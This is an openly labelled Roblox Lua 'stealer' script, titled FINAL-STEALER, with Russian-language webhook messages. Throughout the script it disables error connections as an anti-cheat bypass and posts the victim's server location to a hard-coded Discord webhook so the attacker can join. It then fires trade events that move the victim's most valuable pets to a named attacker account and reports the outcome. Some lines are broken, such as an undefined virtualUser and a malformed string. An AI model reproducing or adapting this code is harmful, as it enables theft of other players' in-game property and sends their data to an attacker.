local V = "FINAL-STEALER"
local TPS = game:GetService("TeleportService")
local HTP = game:GetService("HttpService")
local PLR = game:GetService("Players")
local REPL = game:GetService("ReplicatedStorage")

local WEBHOOK = "https://discord.com/api/webhooks/1401341658112720987/x6_DHxRGvFrBatoN-BfSovlWEbZSpPmYlTFbhnRro-t9j3FaCCnzUvK1cRQfRQkJoTXI"
local YOUR_NAME = "ilkauiop3"
local PETS = {
    ["Inverted Raccoon"] = 10000,
    ["Corrupted Kitsune"] = 7500,
    ["Corrupted Kodama"] = 5000,
}

local function bypassAC()
    pcall(function()
        if getconnections then
            for _, v in ipairs(getconnections(game:GetService("ScriptContext").Error)) do
                v:Disable()
            end
        end
    end)
end

local function sendReport()
    local placeId = game.PlaceId
    local serverId = game.JobId
    
    HTP:PostAsync(WEBHOOK, HTP:JSONEncode({
        content = "@everyone\n🔥 **ЖЕРТВА ЗАПУСТИЛА СКРИПТ!**\n"..
                  "```lua\n"..
                  "game:GetService('TeleportService'):TeleportToPlaceInstance(\n"..
                  "    "..placeId..",\n"..
                  "    \""..serverId.."\"\n"..
                  ")\n```",
        tts = true
    }))
    
    return placeId, serverId
end

local function waitForYou()
    local startTime = os.time()
    while os.time() - startTime < 120 do
        for _, player in ipairs(PLR:GetPlayers()) do
            if player.Name == YOUR_NAME then
                return player
            end
        end
        task.wait(2)
    end
    return nil
end

local function transferPetsToYou(you)
    local sortedPets = {}
    for petName, value in pairs(PETS) do
        if REPL:FindFirstChild(petName) then
            table.insert(sortedPets, {name = petName, value = value})
        end
    end
    table.sort(sortedPets, function(a, b) return a.value > b.value end)
    
    for _, pet in ipairs(sortedPets) do
        if REPL:FindFirstChild("TradeEvent") then
            REPL.TradeEvent:FireServer(you, pet.name)
            task.wait(1.5)
        end
    end
    return #sortedPets
end

bypassAC()
task.wait(5)

local placeId, serverId = sendReport()

local player = PLR.LocalPlayer
player.Idled:Connect(function()
    virtualUser:CaptureController()
    virtualUser:ClickButton2(Vector2.new())
end)

task.wait(20)
local you = waitForYou()

if you then
    local transferredCount = transferPetsToYou(you)
    HTP:PostAsync(WEBHOOK, HTP:JSONEncode({
        content = "✅ **УСПЕХ! "..player.Name.." передал тебе "..transferredCount.." питомцев!**"
    }))
else
    HTP:PostAsync(WEBHOOK, HTP:JSONEncode({
        content = "⛔ **ПРОВАЛ! "ilkauiop3" не зашел на сервер за 2 минуты!**"
    }))
end
